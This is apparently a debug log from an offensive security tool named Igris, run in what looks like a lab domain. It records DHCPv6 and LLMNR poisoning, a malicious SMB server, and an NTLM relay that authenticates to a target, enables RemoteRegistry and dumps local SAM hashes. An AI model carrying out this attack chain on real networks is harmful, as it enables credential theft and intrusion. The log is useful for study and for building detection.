+2021-12-30 16:02:04.227 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:02:04.261 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:04.261 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:05.245 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:05.246 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:06.244 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:06.245 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:08.246 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:08.246 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:12.257 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:12.257 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:20.255 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:20.256 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:20.257 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:03:05.442 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 16:08:28.694 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:08:28.699 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:08:28.717 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:08:28.730 | DEBUG    | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 16:08:28.731 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:08:28.735 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:08:28.735 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:08:28.736 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:08:37.062 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:08:37.062 | SUCCESS  | project.mitm.mss:__ends_process_in_the_background:53 - Finishing mss attack in the background ...
+2021-12-30 16:11:03.341 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:11:03.343 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:11:03.348 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:11:03.368 | DEBUG    | project.mitm.poison.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2021-12-30 16:11:03.372 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:11:03.381 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:11:03.400 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:11:03.400 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:13:18.589 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:13:18.590 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:13:18.593 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:13:18.601 | INFO     | project.mitm.poison.poisonlauncher:__create_llmnr:81 - Running llmnr poisoning in the background
+2021-12-30 16:13:18.602 | DEBUG    | project.mitm.poison.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2021-12-30 16:13:18.602 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:13:18.605 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:13:18.605 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:13:18.605 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:13:22.182 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:13:22.183 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2021-12-30 16:13:22.183 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2021-12-30 16:26:02.951 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:26:02.954 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:26:02.963 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:26:02.983 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:159 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 16:26:02.984 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:26:02.999 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:26:03.005 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:26:03.015 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:26:22.699 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:92 - [36m(DHCP6)Capturing SOLICIT packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:22.702 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:22.703 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:22.703 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:116 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:23.728 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:98 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:23.731 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:23.731 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:23.731 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:121 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:34.613 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:92 - [36m(DHCP6)Capturing SOLICIT packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:34.616 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:34.617 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:34.617 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:116 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:35.625 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:98 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:35.627 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:35.627 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:36.630 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:98 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:36.637 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:36.639 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:38.643 | INFO     | project.mitm.poison.poisoners.dhcp6:__application_layer:98 - [36m(DHCP6)Capturing REQUEST packet from fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:26:38.646 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:112 - Packet crafted: 
+2021-12-30 16:26:38.647 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:26:40.150 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 16:26:53.747 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:26:53.751 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:26:53.772 | WARNING  | project.mitm.ntlmrelay:__checking_directory_options:105 - The specified directory does not exists or you don't have access
+2021-12-30 16:27:26.099 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:364 - Finishing ntlm_relay process ...
+2021-12-30 16:27:26.099 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:369 - Finishing alerts thread ...
+2021-12-30 16:27:37.888 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:27:37.889 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:27:37.896 | WARNING  | project.mitm.ntlmrelay:__checking_directory_options:105 - The specified directory does not exists or you don't have access
+2021-12-30 16:27:37.898 | INFO     | project.mitm.servers.smbserver:start_smb_relay_server:124 - Starting smb-relay server...
+2021-12-30 16:27:37.899 | ERROR    | project.mitm.servers.smbserver:start_smb_relay_server:133 - Address already in use. Is mss running ? 
+2021-12-30 16:28:09.278 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:364 - Finishing ntlm_relay process ...
+2021-12-30 16:28:09.279 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:369 - Finishing alerts thread ...
+2021-12-30 16:28:27.294 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:28:27.299 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:28:27.335 | INFO     | project.mitm.servers.smbserver:start_smb_relay_server:124 - Starting smb-relay server...
+2021-12-30 16:28:27.338 | ERROR    | project.mitm.servers.smbserver:start_smb_relay_server:133 - Address already in use. Is mss running ? 
+2021-12-30 16:28:31.883 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:364 - Finishing ntlm_relay process ...
+2021-12-30 16:28:31.883 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:369 - Finishing alerts thread ...
+2021-12-30 16:31:07.024 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:31:07.029 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:31:07.071 | INFO     | project.mitm.servers.smbserver:start_smb_relay_server:124 - Starting smb-relay server...
+2021-12-30 16:31:07.066 | INFO     | project.mitm.poison.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2021-12-30 16:31:07.088 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-12-30 16:31:25.974 | WARNING  | project.mitm.ntlmrelay:__synchronous_attack:166 - Exiting smb relay attack ...
+2021-12-30 16:31:30.383 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:31:30.384 | INFO     | project.igris:show_settable_variables_necessary:215 - Showing necessary settable variables
+2021-12-30 16:33:45.044 | DEBUG    | project.mitm.ntlmrelay:do_ntlm_relay:453 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:33:45.046 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:33:45.107 | INFO     | project.mitm.servers.smbserver:start_smb_relay_server:124 - Starting smb-relay server...
+2021-12-30 16:33:45.100 | INFO     | project.mitm.poison.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2021-12-30 16:33:45.155 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-12-30 16:33:52.448 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.450 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.1:hostmon / LLMNRResponse
+2021-12-30 16:33:52.450 | INFO     | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2021-12-30 16:33:52.493 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.494 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:64047 / LLMNRResponse
+2021-12-30 16:33:52.494 | INFO     | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2021-12-30 16:33:52.527 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.528 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:64047 / LLMNRResponse
+2021-12-30 16:33:52.528 | INFO     | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2021-12-30 16:33:52.567 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.567 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:58597 / LLMNRResponse
+2021-12-30 16:33:52.569 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.569 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:58597 / LLMNRResponse
+2021-12-30 16:33:52.907 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.907 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:58597 / LLMNRResponse
+2021-12-30 16:33:52.917 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:52.919 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:58597 / LLMNRResponse
+2021-12-30 16:33:53.440 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from SHADOW/IRON@192.168.253.139 controlled, attacking target smb://192.168.253.138
+2021-12-30 16:33:53.600 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2021-12-30 16:33:53.612 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from SHADOW/IRON@192.168.253.139 controlled, but there are no more targets left!
+2021-12-30 16:33:53.813 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-12-30 16:33:53.883 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2021-12-30 16:33:53.892 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:53.893 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:57690 / LLMNRResponse
+2021-12-30 16:33:53.894 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:53.894 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:57690 / LLMNRResponse
+2021-12-30 16:33:53.896 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:53.896 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:62393 / LLMNRResponse
+2021-12-30 16:33:53.897 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:53.898 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:62393 / LLMNRResponse
+2021-12-30 16:33:53.925 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-12-30 16:33:54.313 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:54.313 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:62393 / LLMNRResponse
+2021-12-30 16:33:54.315 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:54.315 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:57690 / LLMNRResponse
+2021-12-30 16:33:54.317 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:54.317 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:57690 / LLMNRResponse
+2021-12-30 16:33:54.324 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:33:54.329 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:62393 / LLMNRResponse
+2021-12-30 16:33:55.296 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2021-12-30 16:33:55.543 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-12-30 16:33:57.395 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2021-12-30 16:33:57.412 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-12-30 16:33:57.425 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2021-12-30 16:34:00.788 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:34:00.789 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:hostmon > fe80::ad5d:a0a0:f1d:bb1d:55827 / LLMNRResponse
+2021-12-30 16:34:00.789 | INFO     | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2021-12-30 16:34:00.828 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:113 - Packet crafted: 
+2021-12-30 16:34:00.828 | DEBUG    | project.mitm.poison.poisoners.llmnr:__send_packet:114 - Ether / IP / UDP 192.168.253.135:hostmon > 192.168.253.139:55827 / LLMNRResponse
+2021-12-30 16:34:00.828 | INFO     | project.mitm.poison.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.139[0m
+2021-12-30 16:34:00.886 | WARNING  | project.mitm.ntlmrelay:__synchronous_attack:166 - Exiting smb relay attack ...
+2021-12-30 16:34:07.038 | DEBUG    | project.mitm.ntlmrelay:ntlm_relay_postloop:369 - Finishing alerts thread ...
